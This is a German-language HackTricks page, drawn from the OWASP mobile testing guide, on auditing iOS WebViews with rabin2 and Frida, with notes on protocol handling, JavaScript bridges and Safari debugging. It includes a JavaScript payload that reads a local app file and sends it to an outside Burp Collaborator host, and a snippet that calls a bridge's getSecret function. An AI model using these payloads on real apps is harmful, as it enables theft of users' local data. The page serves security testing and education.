# iOS WebViews

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

Der Code dieser Seite wurde [hier](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md) extrahiert. √úberpr√ºfen Sie die Seite f√ºr weitere Details.

## WebViews-Typen

WebViews werden innerhalb von Anwendungen verwendet, um interaktive Webinhalte anzuzeigen. Verschiedene Arten von WebViews bieten unterschiedliche Funktionen und Sicherheitsmerkmale f√ºr iOS-Anwendungen. Hier ist eine kurze √úbersicht:

- **UIWebView**, das ab iOS 12 nicht mehr empfohlen wird, da es keine Unterst√ºtzung f√ºr das Deaktivieren von **JavaScript** bietet, was es anf√§llig f√ºr Skripteinspritzung und **Cross-Site Scripting (XSS)**-Angriffe macht.

- **WKWebView** ist die bevorzugte Option zur Integration von Webinhalten in Apps und bietet verbesserte Kontrolle √ºber die Inhalte und Sicherheitsmerkmale. **JavaScript** ist standardm√§√üig aktiviert, kann jedoch bei Bedarf deaktiviert werden. Es unterst√ºtzt auch Funktionen, um zu verhindern, dass JavaScript automatisch Fenster √∂ffnet, und stellt sicher, dass alle Inhalte sicher geladen werden. Dar√ºber hinaus minimiert die Architektur von **WKWebView** das Risiko von Speicherbesch√§digungen, die den Hauptanwendungsprozess betreffen.

- **SFSafariViewController** bietet ein standardisiertes Webbrowser-Erlebnis innerhalb von Apps, erkennbar an seinem spezifischen Layout, das ein schreibgesch√ºtztes Adressfeld, Freigabe- und Navigationsschaltfl√§chen sowie einen direkten Link zum √ñffnen von Inhalten in Safari umfasst. Im Gegensatz zu **WKWebView** kann **JavaScript** im **SFSafariViewController** nicht deaktiviert werden, der auch Cookies und Daten mit Safari teilt und die Privatsph√§re des Benutzers von der App aus wahrt. Es muss gem√§√ü den Richtlinien des App Store deutlich angezeigt werden.
```javascript
// Example of disabling JavaScript in WKWebView:
WKPreferences *preferences = [[WKPreferences alloc] init];
preferences.javaScriptEnabled = NO;
WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
config.preferences = preferences;
WKWebView *webView = [[WKWebView alloc] initWithFrame:CGRectZero configuration:config];
```
## WebViews Konfigurationsuntersuchung Zusammenfassung

### **Statische Analyse √úbersicht**

Im Prozess der Untersuchung von **WebViews** Konfigurationen konzentriert man sich auf zwei Haupttypen: **UIWebView** und **WKWebView**. Zur Identifizierung dieser WebViews innerhalb einer Bin√§rdatei werden Befehle verwendet, die nach spezifischen Klassenreferenzen und Initialisierungsmethoden suchen.

- **UIWebView Identifizierung**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
```
Dieser Befehl hilft dabei, Instanzen von **UIWebView** zu lokalisieren, indem nach Textzeichenfolgen gesucht wird, die damit im Bin√§rformat verbunden sind.

- **WKWebView Identifizierung**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
```
Ebenso sucht dieser Befehl f√ºr **WKWebView** im Bin√§rformat nach Textzeichenfolgen, die auf seine Verwendung hinweisen.

Dar√ºber hinaus wird der folgende Befehl ausgef√ºhrt, um herauszufinden, wie ein **WKWebView** initialisiert wird, wobei die Methodensignatur, die mit seiner Initialisierung zusammenh√§ngt, angesprochen wird:
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
```
#### **JavaScript-Konfigurations√ºberpr√ºfung**

F√ºr **WKWebView** wird hervorgehoben, dass das Deaktivieren von JavaScript eine bew√§hrte Methode ist, es sei denn, es ist erforderlich. Die kompilierte Bin√§rdatei wird durchsucht, um zu best√§tigen, dass die `javaScriptEnabled`-Eigenschaft auf `false` gesetzt ist, um sicherzustellen, dass JavaScript deaktiviert ist:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
```
#### **Nur sichere Inhalts√ºberpr√ºfung**

**WKWebView** bietet die M√∂glichkeit, Probleme mit gemischtem Inhalt zu identifizieren, im Gegensatz zu **UIWebView**. Dies wird mit der `hasOnlySecureContent`-Eigenschaft √ºberpr√ºft, um sicherzustellen, dass alle Seitenressourcen √ºber sichere Verbindungen geladen werden. Die Suche im kompilierten Bin√§rformat erfolgt wie folgt:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
### **Einblicke in die dynamische Analyse**

Die dynamische Analyse umfasst die Inspektion des Heaps nach WebView-Instanzen und deren Eigenschaften. Ein Skript namens `webviews_inspector.js` wird zu diesem Zweck verwendet und zielt auf `UIWebView`, `WKWebView` und `SFSafariViewController`-Instanzen ab. Es protokolliert Informationen √ºber gefundene Instanzen, einschlie√ülich URLs und Einstellungen im Zusammenhang mit JavaScript und sicherem Inhalt.

Die Heap-Inspektion kann mit `ObjC.choose()` durchgef√ºhrt werden, um WebView-Instanzen zu identifizieren und die Eigenschaften `javaScriptEnabled` und `hasonlysecurecontent` zu √ºberpr√ºfen.

{% code title="webviews_inspector.js" %}
```javascript
ObjC.choose(ObjC.classes['UIWebView'], {
onMatch: function (ui) {
console.log('onMatch: ', ui);
console.log('URL: ', ui.request().toString());
},
onComplete: function () {
console.log('done for UIWebView!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
onMatch: function (sf) {
console.log('onMatch: ', sf);
},
onComplete: function () {
console.log('done for SFSafariViewController!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
}
});
```
{% endcode %}

Das Skript wird ausgef√ºhrt mit:
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js
```
**Wichtige Ergebnisse**:
- Instanzen von WebViews werden erfolgreich lokalisiert und inspiziert.
- Die Aktivierung von JavaScript und die sicheren Inhaltseinstellungen werden √ºberpr√ºft.

Diese Zusammenfassung fasst die kritischen Schritte und Befehle zusammen, die an der Analyse von WebView-Konfigurationen durch statische und dynamische Ans√§tze beteiligt sind, wobei der Fokus auf Sicherheitsfunktionen wie der Aktivierung von JavaScript und der Erkennung gemischter Inhalte liegt.

## WebView-Protokollverarbeitung

Die Verarbeitung von Inhalten in WebViews ist ein kritischer Aspekt, insbesondere beim Umgang mit verschiedenen Protokollen wie `http(s)://`, `file://` und `tel://`. Diese Protokolle erm√∂glichen das Laden von sowohl entfernten als auch lokalen Inhalten innerhalb von Apps. Es wird betont, dass beim Laden lokaler Inhalte Vorsichtsma√ünahmen getroffen werden m√ºssen, um zu verhindern, dass Benutzer den Namen oder den Pfad der Datei beeinflussen oder den Inhalt selbst bearbeiten.

**WebViews** bieten verschiedene Methoden zum Laden von Inhalten. F√ºr **UIWebView**, das jetzt veraltet ist, werden Methoden wie `loadHTMLString:baseURL:` und `loadData:MIMEType:textEncodingName:baseURL:` verwendet. **WKWebView** hingegen verwendet `loadHTMLString:baseURL:`, `loadData:MIMEType:textEncodingName:baseURL:` und `loadRequest:` f√ºr Webinhalte. Methoden wie `pathForResource:ofType:`, `URLForResource:withExtension:` und `init(contentsOf:encoding:)` werden typischerweise zum Laden lokaler Dateien verwendet. Die Methode `loadFileURL:allowingReadAccessToURL:` ist besonders bemerkenswert f√ºr ihre F√§higkeit, eine bestimmte URL oder ein Verzeichnis in den WebView zu laden, was potenziell sensible Daten offenlegen kann, wenn ein Verzeichnis angegeben wird.

Um diese Methoden im Quellcode oder in der kompilierten Bin√§rdatei zu finden, k√∂nnen Befehle wie die folgenden verwendet werden:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
Bez√ºglich **Dateizugriff** erlaubt UIWebView diesen universell, w√§hrend WKWebView die Einstellungen `allowFileAccessFromFileURLs` und `allowUniversalAccessFromFileURLs` einf√ºhrt, um den Zugriff von Datei-URLs zu verwalten, wobei beide standardm√§√üig auf false gesetzt sind.

Ein Frida-Skriptbeispiel wird bereitgestellt, um die **WKWebView**-Konfigurationen f√ºr Sicherheitseinstellungen zu inspizieren:
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
console.log('allowFileAccessFromFileURLs: ',
wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
console.log('allowUniversalAccessFromFileURLs: ',
wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});
```
Zuletzt zeigt ein Beispiel f√ºr eine JavaScript-Nutzlast, die darauf abzielt, lokale Dateien zu exfiltrieren, das potenzielle Sicherheitsrisiko, das mit unsachgem√§√ü konfigurierten WebViews verbunden ist. Diese Nutzlast kodiert den Inhalt von Dateien in das Hex-Format, bevor sie an einen Server √ºbertragen wird, und hebt die Bedeutung strenger Sicherheitsma√ünahmen in WebView-Implementierungen hervor.
```javascript
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## Native Methoden, die durch WebViews exponiert werden

## Verst√§ndnis der WebView-Nativen Schnittstellen in iOS

Seit iOS 7 bietet Apple APIs f√ºr **die Kommunikation zwischen JavaScript in einem WebView und nativen** Swift- oder Objective-C-Objekten. Diese Integration wird haupts√§chlich durch zwei Methoden erleichtert:

- **JSContext**: Eine JavaScript-Funktion wird automatisch erstellt, wenn ein Swift- oder Objective-C-Block mit einem Bezeichner innerhalb eines `JSContext` verkn√ºpft wird. Dies erm√∂glicht eine nahtlose Integration und Kommunikation zwischen JavaScript und nativen Code.
- **JSExport-Protokoll**: Durch die Vererbung des `JSExport`-Protokolls k√∂nnen native Eigenschaften, Instanzmethoden und Klassenmethoden f√ºr JavaScript exponiert werden. Das bedeutet, dass alle √Ñnderungen, die in der JavaScript-Umgebung vorgenommen werden, in der nativen Umgebung gespiegelt werden und umgekehrt. Es ist jedoch wichtig sicherzustellen, dass sensible Daten nicht unbeabsichtigt durch diese Methode exponiert werden.

### Zugriff auf `JSContext` in Objective-C

In Objective-C kann der `JSContext` f√ºr ein `UIWebView` mit der folgenden Codezeile abgerufen werden:
```objc
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
### Kommunikation mit `WKWebView`

F√ºr `WKWebView` ist der direkte Zugriff auf `JSContext` nicht verf√ºgbar. Stattdessen wird die Nachrichten√ºbermittlung √ºber die Funktion `postMessage` genutzt, die die Kommunikation zwischen JavaScript und der nativen Anwendung erm√∂glicht. Handler f√ºr diese Nachrichten werden wie folgt eingerichtet, um JavaScript eine sichere Interaktion mit der nativen Anwendung zu erm√∂glichen:
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
options_dict["javaScriptBridge"]?.value = enabled
let userContentController = wkWebViewConfiguration.userContentController
userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

if enabled {
let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
}
}
```
### Interaktion und Testen

JavaScript kann mit der nativen Schicht interagieren, indem es einen Skript-Nachrichtenhandler definiert. Dies erm√∂glicht Operationen wie das Aufrufen nativer Funktionen von einer Webseite:
```javascript
function invokeNativeOperation() {
value1 = document.getElementById("value1").value
value2 = document.getElementById("value2").value
window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}

// Alternative method for calling exposed JavaScript functions
document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
Um das Ergebnis eines nativen Funktionsaufrufs zu erfassen und zu manipulieren, kann man die Callback-Funktion innerhalb des HTML √ºberschreiben:
```html
<html>
<script>
document.location = "javascriptbridge://getSecret"
function javascriptBridgeCallBack(name, result) {
alert(result);
}
</script>
</html>
```
Die native Seite verarbeitet den JavaScript-Aufruf, wie in der Klasse `JavaScriptBridgeMessageHandler` gezeigt, wo das Ergebnis von Operationen wie der Multiplikation von Zahlen verarbeitet und zur Anzeige oder weiteren Manipulation an JavaScript zur√ºckgesendet wird:
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {
// Handling "multiplyNumbers" operation
case "multiplyNumbers":
let arg1 = Double(messageArray[1])!
let arg2 = Double(messageArray[2])!
result = String(arg1 * arg2)
// Callback to JavaScript
let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
}
```
## Debugging iOS WebViews

(Tutorial basierend auf dem von [https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews))

Um Webinhalte innerhalb von iOS-Webviews effektiv zu debuggen, ist eine spezifische Einrichtung erforderlich, die die Entwicklertools von Safari nutzt, da Nachrichten, die an `console.log()` gesendet werden, nicht in den Xcode-Protokollen angezeigt werden. Hier ist eine vereinfachte Anleitung, die die wichtigsten Schritte und Anforderungen hervorhebt:

- **Vorbereitung auf dem iOS-Ger√§t**: Der Safari-Webinspektor muss auf Ihrem iOS-Ger√§t aktiviert werden. Dies geschieht, indem Sie zu **Einstellungen > Safari > Erweitert** gehen und den _Webinspektor_ aktivieren.

- **Vorbereitung auf dem macOS-Ger√§t**: Auf Ihrem macOS-Entwicklungsrechner m√ºssen Sie die Entwicklertools in Safari aktivieren. Starten Sie Safari, greifen Sie auf **Safari > Einstellungen > Erweitert** zu und w√§hlen Sie die Option _Entwicklungsmen√º anzeigen_.

- **Verbindung und Debugging**: Nachdem Sie Ihr iOS-Ger√§t mit Ihrem macOS-Computer verbunden und Ihre Anwendung gestartet haben, verwenden Sie Safari auf Ihrem macOS-Ger√§t, um das Webview auszuw√§hlen, das Sie debuggen m√∂chten. Navigieren Sie zu _Entwickeln_ in der Men√ºleiste von Safari, fahren Sie mit der Maus √ºber den Namen Ihres iOS-Ger√§ts, um eine Liste der Webview-Instanzen anzuzeigen, und w√§hlen Sie die Instanz aus, die Sie inspizieren m√∂chten. Ein neues Safari-Webinspektor-Fenster wird zu diesem Zweck ge√∂ffnet.

Seien Sie sich jedoch der Einschr√§nkungen bewusst:

- Das Debugging mit dieser Methode erfordert ein macOS-Ger√§t, da es auf Safari angewiesen ist.
- Nur Webviews in Anwendungen, die √ºber Xcode auf Ihr Ger√§t geladen wurden, sind f√ºr das Debugging berechtigt. Webviews in Apps, die √ºber den App Store oder Apple Configurator installiert wurden, k√∂nnen auf diese Weise nicht debuggt werden.


## References

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
